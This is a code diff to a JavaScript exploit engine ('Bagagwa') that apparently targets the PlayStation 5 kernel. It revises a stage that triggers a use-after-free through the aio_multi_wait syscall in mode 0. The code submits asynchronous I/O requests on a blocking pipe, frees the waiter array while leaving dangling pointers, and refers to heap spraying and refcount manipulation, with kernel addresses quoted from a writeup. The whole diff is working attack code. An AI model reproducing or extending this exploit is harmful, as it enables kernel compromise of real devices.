@@ -148,7 +148,6 @@ export function makeBagagwaEngine(X) {
 
     const S = {
         aioInited:       false,
-        aioInstances:    [],
         aioRequests:     [],
         uafTriggered:    false,
         uafRequestIdx:   -1,
@@ -185,69 +184,47 @@ export function makeBagagwaEngine(X) {
         return { base: ptr, u8, bytes: size, label };
     }
 
-    async function initAio() {
-        if (S.aioInited) return { ok: true, cached: true };
-        const r = await sys(SYS_AIO_INIT, 0, 0);
-        if (r.failed) return { ok: false, why: "aio_init failed: " + r.errText };
-        S.aioInited = true;
-        note("AIO subsystem initialized");
-        return { ok: true };
-    }
-
-    async function createAioInstance() {
-        const r = await sys(SYS_AIO_CREATE, 0);
-        if (r.failed) return { ok: false, why: "aio_create failed: " + r.errText };
-        const id = r.s32;
-        S.aioInstances.push(id);
-        return { ok: true, id };
-    }
-
-    async function submitAioRequest(instanceId, buf, size, fd, offset) {
-        const reqBuf = alloc(0x40, "aio-request-" + S.aioRequests.length);
+    async function submitAioRequest(fd, buf, size, offset) {
+        const idx = S.aioRequests.length;
+        const reqBuf = alloc(0x40, "aio-req-" + idx);
         w32(reqBuf.u8, 0x00, fd);
         w64(reqBuf.u8, 0x08, buf);
         w64(reqBuf.u8, 0x10, i64(size, 0));
         w64(reqBuf.u8, 0x18, offset || i64(0, 0));
         w32(reqBuf.u8, 0x20, 0);
 
-        const r = await sys(SYS_AIO_SUBMIT, instanceId, reqBuf.base, 1);
-        if (r.failed) return { ok: false, why: "aio_submit failed: " + r.errText };
-        const reqId = r.s32;
-        S.aioRequests.push({ id: reqId, instanceId, buf: reqBuf });
-        return { ok: true, reqId };
+        note("[SUBMIT-" + idx + "] fd=" + fd + " sz=" + size);
+        const r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
+        note("[SUBMIT-" + idx + "] ret=" + r.s32 +
+            " err=" + r.errText + " hex=" + r.hex);
+        if (r.failed) return { ok: false, why: "aio_submit: " + r.errText };
+        S.aioRequests.push({ id: r.s32, buf: reqBuf });
+        return { ok: true, reqId: r.s32 };
     }
 
-    async function triggerUaf(numRequests) {
-        const num = numRequests || 2;
+    async function triggerUaf(num) {
         if (S.aioRequests.length < num)
-            return { ok: false, why: "need at least " + num + " AIO requests, have " + S.aioRequests.length };
+            return { ok: false, why: "need " + num + " reqs, have " +
+                S.aioRequests.length };
 
-        const instanceId = S.aioRequests[0].instanceId;
-
-        const reqIdBuf = alloc(num * 4, "aio-multi-wait-ids");
+        const reqIdBuf = alloc(num * 4, "aio-wait-ids");
         for (let i = 0; i < num; i++) {
             w32(reqIdBuf.u8, i * 4, S.aioRequests[i].id);
+            note("[UAF] slot " + i + " reqId=" + S.aioRequests[i].id);
         }
 
-        // PS5 AIO syscalls all take instanceId as first arg
-        // (aio_submit, aio_multi_poll, aio_multi_delete all do).
-        // aio_multi_wait(instanceId, ids, num, mode)
-        // Mode 0 links shared waiter node → cleanup frees → UAF.
-        // Requests stay pending; triggerWaker writes to pipe later
-        // to complete them, firing the waker on the dangling node.
-        note("triggering aio_multi_wait mode 0: instance=" +
-            instanceId + " num=" + num);
-        flushMark("BAGAGWA-UAF-PRE", "inst=" + instanceId +
-            "-num=" + num + "-mode=0");
-
+        note("[UAF] aio_multi_wait(ids," + num + ",timeout=0,mode=0)");
+        note("[UAF] writeup sec.2: PS4=3args, PS5 adds mode → 4 args");
         const r = await sys(SYS_AIO_MULTI_WAIT,
-            instanceId, reqIdBuf.base, num, AIO_MULTI_WAIT_MODE_0);
+            reqIdBuf.base, num, 0, AIO_MULTI_WAIT_MODE_0);
+        note("[UAF] ret=" + r.s32 + " err=" + r.errText +
+            " hex=" + r.hex);
 
-        flushMark("BAGAGWA-UAF-POST", "ret=" + r.s32 + "-" + r.errText);
-
-        S.uafTriggered = true;
-        S.uafRequestIdx = 0;
-        return { ok: true, ret: r.s32 };
+        if (!r.failed) {
+            S.uafTriggered = true;
+            S.uafRequestIdx = 0;
+        }
+        return { ok: !r.failed, ret: r.s32 };
     }
 
     async function sprayOsem(count, batchSize) {
@@ -344,10 +321,7 @@ export function makeBagagwaEngine(X) {
 
         await sleep(100);
 
-        const pollBuf = alloc(4, "waker-poll");
-        const pr = await sys(SYS_AIO_MULTI_POLL, req.instanceId, pollBuf.base, 1, 0);
-
-        return { ok: !wr.failed, writeRet: wr.s32, pollRet: pr.s32 };
+        return { ok: !wr.failed, writeRet: wr.s32 };
     }
 
     async function manipulateOsemRefcount(targetHandle, decrements) {
@@ -545,69 +519,55 @@ export function makeBagagwaEngine(X) {
         const out = { ok: false, why: "", steps: [] };
 
         note("=== Stage 0: aio_multi_wait mode 0 UAF ===");
+        note("writeup sec.1: syscall 663 @ 0x805c0210");
+        note("writeup sec.1: mode 0 @ 0x805c08e5 rcx=[rbx+0x40]");
+        note("writeup sec.2: PS4=3args no mode, PS5 adds mode=4args");
+        note("writeup sec.1: cleanup @ 0x805c0da1, free @ 0x805c0f93");
 
-        const stubs = [
-            [SYS_AIO_INIT, "aio_init"],
-            [SYS_AIO_CREATE, "aio_create"],
-            [SYS_AIO_SUBMIT, "aio_submit"],
-            [SYS_AIO_MULTI_WAIT, "aio_multi_wait"],
-            [SYS_PIPE2, "pipe2"],
-            [SYS_READ, "read"],
-            [SYS_WRITE, "write"],
-        ];
-        const missing = stubs.filter(([num]) => P.syscalls[num] === undefined);
-        if (missing.length) {
-            out.why = "missing syscall stubs: " + missing.map(([n, l]) =>
-                "0x" + n.toString(16) + " (" + l + ")").join(", ");
+        if (P.syscalls[SYS_AIO_SUBMIT] === undefined ||
+            P.syscalls[SYS_AIO_MULTI_WAIT] === undefined) {
+            out.why = "missing aio stubs";
             return out;
         }
-        out.steps.push("syscall stubs verified");
 
-        const ir = await initAio();
-        if (!ir.ok) { out.why = ir.why; return out; }
-        out.steps.push("AIO initialized");
-
+        note("[S0-1] pipe (empty — reads must block)");
         const pipeBuf = alloc(8, "uaf-pipe");
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
         const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
-        if (pipeR.failed) { out.why = "pipe2 for AIO failed: " + pipeR.errText; return out; }
+        note("[S0-1] pipe2 ret=" + pipeR.s32 + " " + pipeR.errText);
+        if (pipeR.failed) { out.why = "pipe2: " + pipeR.errText; return out; }
         S.aioRfd = r32(pipeBuf.u8, 0) | 0;
         S.aioWfd = r32(pipeBuf.u8, 4) | 0;
         track(S.aioRfd); track(S.aioWfd);
-        out.steps.push("AIO pipe: r=" + S.aioRfd + " w=" + S.aioWfd);
+        out.steps.push("pipe r=" + S.aioRfd + " w=" + S.aioWfd);
 
-        const numRequests = o.numRequests || 2;
-
-        const fillSize = 64 * numRequests;
-        const fillBuf = alloc(fillSize, "uaf-pipe-fill");
-        for (let j = 0; j < fillSize; j++) fillBuf.u8[j] = 0x41;
-        const fillR = await sys(SYS_WRITE, S.aioWfd, fillBuf.base, fillSize);
-        if (fillR.failed) { out.why = "pipe fill: " + fillR.errText; return out; }
-        out.steps.push("pipe pre-filled " + fillSize + "B (reads complete immediately)");
-
-        const ci = await createAioInstance();
-        if (!ci.ok) { out.why = ci.why; return out; }
-        out.steps.push("AIO instance created: " + ci.id);
-
+        const num = o.numRequests || 2;
         const dataBuf = alloc(64, "aio-data");
-        for (let i = 0; i < numRequests; i++) {
-            const sr = await submitAioRequest(ci.id, dataBuf.base, 64, S.aioRfd, i64(0, 0));
-            if (!sr.ok) { out.why = sr.why; return out; }
-            out.steps.push("AIO request " + i + " submitted: id=" + sr.reqId);
+        for (let i = 0; i < num; i++) {
+            note("[S0-2." + i + "] aio_submit(req,1) fd=" + S.aioRfd);
+            const sr = await submitAioRequest(S.aioRfd, dataBuf.base, 64,
+                i64(0, 0));
+            if (!sr.ok) {
+                out.why = "submit[" + i + "]: " + sr.why;
+                return out;
+            }
+            out.steps.push("req " + i + " id=" + sr.reqId);
         }
 
-        const uafR = await triggerUaf(numRequests);
-        out.steps.push("aio_multi_wait mode 0 returned: " + uafR.ret);
+        note("[S0-3] aio_multi_wait(ids," + num + ",0,mode=0) — 4 args");
+        const uafR = await triggerUaf(num);
+        out.steps.push("multi_wait ret=" + uafR.ret);
 
-        if (!S.uafTriggered) {
-            out.why = "UAF trigger did not fire";
-            return out;
+        if (uafR.ok) {
+            out.ok = true;
+            note("[S0-4] UAF done — waiter array freed");
+            note("writeup: reqs 0.." + (num - 2) + " dangling");
+            note("writeup: waiter num=2 → 0x70 → 128 UMA zone");
+        } else {
+            out.why = "multi_wait: " + (uafR.why || "ret=" + uafR.ret);
         }
 
-        out.ok = true;
-        flushMark("BAGAGWA-STAGE0-DONE", "numRequests=" + numRequests +
-            "-uafTriggered=1-danglingReqIdx=0");
-        note("UAF triggered: waiter array freed, request 0 holds dangling pointer");
+        flushMark("BAGAGWA-STAGE0", "ok=" + out.ok);
         return out;
     }
 
@@ -1049,7 +1009,7 @@ export function makeBagagwaEngine(X) {
         }
 
         for (const req of S.aioRequests) {
-            await sys(SYS_AIO_MULTI_DELETE, req.instanceId, req.id);
+            await sys(SYS_AIO_MULTI_DELETE, req.id);
         }
 
         const pipeFds = [S.aioRfd, S.aioWfd, S.masterRfd, S.masterWfd,
@@ -1069,8 +1029,6 @@ export function makeBagagwaEngine(X) {
         S,
         OFF,
 
-        initAio,
-        createAioInstance,
         submitAioRequest,
         triggerUaf,
         sprayOsem,
